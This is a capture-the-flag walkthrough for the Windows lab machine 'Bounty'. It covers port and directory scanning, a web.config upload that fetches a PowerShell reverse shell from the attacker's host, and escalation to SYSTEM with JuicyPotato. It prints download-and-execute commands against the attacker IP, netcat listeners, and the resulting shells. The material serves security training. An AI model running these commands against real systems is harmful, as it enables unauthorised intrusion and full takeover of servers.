# Machine Name: Bounty  
# Machine IP: 10.129.28.70  
# Type: Windows  
# Difficulty: Easy  
  
As usual, I started with open port scan:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/bounty]
└─$ nmap -A 10.129.28.70                     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-03 18:00 +0400
Nmap scan report for 10.129.28.70
Host is up (0.17s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   153.42 ms 10.10.16.1
2   227.81 ms 10.129.28.70
```
Only port **80 (http)** is open. I looked at the server name and version **(IIS 7.5)**. There wasn't any popular exploit for this version so I decided to make two directory scan. In the first one, I used a specific wordlist which was designed for IIS service.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/bounty]
└─$ ffuf -u http://10.129.28.70/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/IIS.txt -ic -fs 0

aspnet_client/          [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 335ms]
iisstart.htm            [Status: 200, Size: 630, Words: 25, Lines: 32, Duration: 118ms]
trace.axd               [Status: 403, Size: 2062, Words: 463, Lines: 50, Duration: 131ms]
```
In addition to this, I searched for the **most popular file extensions** that are used in **IIS servers**. Based on my findings, I used this command.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/bounty]
└─$ ffuf -u http://10.129.28.70/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -e .config,.aspx,.php,.ashx,.bak -ic -fs 0 -t 100

transfer.aspx           [Status: 200, Size: 941, Words: 89, Lines: 22, Duration: 268ms]
UploadedFiles           [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 143ms]
uploadedFiles           [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 123ms]
uploadedfiles           [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 194ms]
:: Progress: [525906/525906] :: Job [1/1] :: 711 req/sec :: Duration: [0:18:46] :: Errors: 0 ::
```
It only gave these files. Let's check the aspx file on the website **(http://10.129.28.70/transfer.aspx)**. Yeah it is a file upload page. I tried different file types but they were in blacklist so I cannot upload. I checked **.txt,.php,.aspx** and other reverse shell files but didn't work.    
So, I decided to upload **web.config** file to there.     
**Web.config** is a configuration file used by **IIS (Microsoft's web server)** to control how the server handles requests. We uploaded it because IIS automatically parses and executes it — unlike .aspx or .php files which were blocked by the upload filter.    
It wasn't enough alone; we also needed **Invoke-PowerShellTcp.ps1**, which **web.config** fetched and executed to give us the *reverse shell*.    
You can get these files from my repository for this CTF.   

----
# Initial Access   
First of all lets open our python server. Because when the web.config is triggered by IIS, it immediately tries to fetch Invoke-PowerShellTcp.ps1 from our machine — if the Python server isn't running at that moment, the download fails and we get no shell.     
```bash
python3 -m http.server 80
```
Open nc connection in another terminal.      
```bash
rlwrap nc -lvnp 9001
```
Then all you need is to **upload** the **"web.config"** file on the website and run this command:    
```bash
curl http://10.129.28.70/UploadedFiles/web.config
```

We got it !!!!!!!  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/bounty]
└─$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.235] from (UNKNOWN) [10.129.28.70] 49159
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>
```

----
# Privilege Escalation  
Let's look at our privileges  
```bash
PS C:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv>
```
**SeImpersonatePrivilege** is a Windows privilege that allows a process to *"impersonate"* another user — meaning it can temporarily act as that user and use their permissions.  
> Here's how we abused it step by step:    
**JuicyPotato** exploits the Windows **COM/DCOM** activation mechanism. When a COM object is activated under a privileged CLSID (like {4991d34b...}), Windows internally authenticates as SYSTEM to start that object. At that moment, JuicyPotato intercepts the authentication and captures the **SYSTEM token**.   
Normally, stealing a token like this would be impossible — but because we had SeImpersonatePrivilege, Windows actually allowed our process to hold and use that SYSTEM token. Without this privilege, the token theft would be blocked.    
Once JuicyPotato had the SYSTEM token, it called **CreateProcessWithTokenW** — a Windows API that spawns a new process under a specific token. It used the stolen SYSTEM token to launch our **nc64.exe** / PowerShell reverse shell, which means that new process ran as **NT AUTHORITY\SYSTEM**, giving us full control over the machine.      

We need to download "JuicyPotato" and "nc64.exe" to our kali if it doesn't exists.    
```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
```
Then, execute these commands in powershell to upload the files from out kali to target device:       
```bash
(New-Object Net.WebClient).DownloadFile('http://10.10.16.235/JuicyPotato.exe', 'C:\Windows\Temp\jp.exe')
(New-Object Net.WebClient).DownloadFile('http://10.10.16.235/nc64.exe', 'C:\Windows\Temp\nc64.exe')
```
Next, go to another terminal and open another nc connection:       
```bash
nc -lnvp 9002
```
Before running the final command, be sure you executed this command:      
```bash
sed -i 's/9001/9002/' ~/Downloads/bounty/Invoke-PowerShellTcp.ps1
```
Because we need to change the last line of the PowerShellTcp.ps1 script. Because for the new connection we will use this script again and if we don't change the port number inside it, it will not work.     
Now, you just need to run this command:    
```bash
C:\Windows\Temp\jp.exe -l 9008 -p C:\Windows\System32\cmd.exe -a "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.235/Invoke-PowerShellTcp.ps1')" -t *
```

BINGOO !! We are the system user right now !!!    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/bounty]
└─$ rlwrap nc -lvnp 9002                                             
listening on [any] 9002 ...
connect to [10.10.16.235] from (UNKNOWN) [10.129.28.70] 49167
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32>
```
Let's get the flags:   
```bash
cat C:\Users\Administrator\Desktop\root.txt
type C:\Users\merlin\Desktop\user.txt
```




















